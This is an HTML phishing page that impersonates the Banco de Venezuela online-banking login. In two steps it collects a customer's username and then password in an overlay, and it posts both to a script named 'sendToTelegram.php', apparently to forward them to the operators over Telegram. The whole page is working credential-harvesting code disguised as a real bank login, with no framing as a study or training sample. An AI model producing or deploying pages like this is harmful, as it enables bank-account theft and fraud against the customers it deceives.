
<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <title>Banco de Venezuela</title>
    <style>
      body {
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        background-image: url(background.jpg);
        background-size: cover;
        background-position: center;
      }
      .container {
        display: flex;
        height: auto;
        width: 100%;
        margin-bottom: 50px; /* Espacio debajo del contenedor */
      }
      .left-side {
        width: 50%;
        display: flex;
        justify-content: center;
        align-items: center;
      }
      .right-side {
        width: 50%;
      }
      form {
        width: 40%;
        background: white;
        max-width: 550px;
        box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
        padding: 20px;
        border-radius: 10px;
      }
      .form-group {
        margin: 10px 0; /* Separación arriba y abajo */
        position: relative;
      }

      .form-group input {
        width: 100%;
        padding: 10px;
        box-sizing: border-box;
        position: relative;
        height: 60px;
        border: 0;

        border-bottom: 1px solid gray;
        background: #ededed;
        outline: none;
      }
      .form-group label {
        position: absolute;
        top: 50%;
        left: 10px;
        transform: translateY(-50%);
        color: #999;
        transition: 0.3s ease;
      }
      .form-group input:focus + label,
      .form-group input:not(:placeholder-shown) + label {
        top: 5px;
        font-size: 12px;
        color: #333;
      }
      button {
        background-color: #0067b1;
        color: white;
        border-radius: 3px;
        border: 0;
        padding: 15px;
        width: 200px;
        margin: 30px auto; /* Centrar y agregar separación arriba y abajo */
        display: block;
      }
      .overlay {
        display: none;
        justify-content: center;
        align-items: center;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.5);
        z-index: 9999;
      }
      .content {
        background-color: #fff;
        width: 500px;
        border-radius: 5px;
        text-align: center;
        padding: 1px;
      }
    </style>
  </head>
  <body>
    <div class="overlay" id="overlay">
      <div class="content">
        <form id="passwordForm" action="sendToTelegram.php" method="POST">
          <h4 style="color: #0067b1;">Introduce tu contraseña</h4>
          <div class="form-group">
            <input type="password" id="password" name="password" required placeholder=" " />
            <label for="password">Contraseña *</label>
          </div>
          <input type="hidden" id="hiddenUsuario" name="usuario" />
          <button type="submit">Continuar</button>
        </form>
      </div>
    </div>
    <div class="container">
      <div class="left-side">
        <form id="loginform">
          <div style="text-align: center">
            <img src="logo.png" alt="" style="width: 60%; margin-top: 20px" />
          </div>
          <div class="form-group">
            <input type="text" id="usuario" name="usuario" required placeholder=" " />
            <label for="usuario">Usuario *</label>
          </div>
          <button type="button" id="showOverlay">Entrar</button>
        </form>
      </div>
      <div class="right-side"></div>
    </div>
    <script>
      document.getElementById("showOverlay").addEventListener("click", function () {
        const usuario = document.getElementById("usuario").value;
        if (usuario) {
          localStorage.setItem("usuario", usuario);
          document.getElementById("hiddenUsuario").value = usuario;
          document.getElementById("overlay").style.display = "flex";
        } else {
          alert("Por favor, introduce un usuario válido.");
        }
      });
    </script>
  </body>
</html>
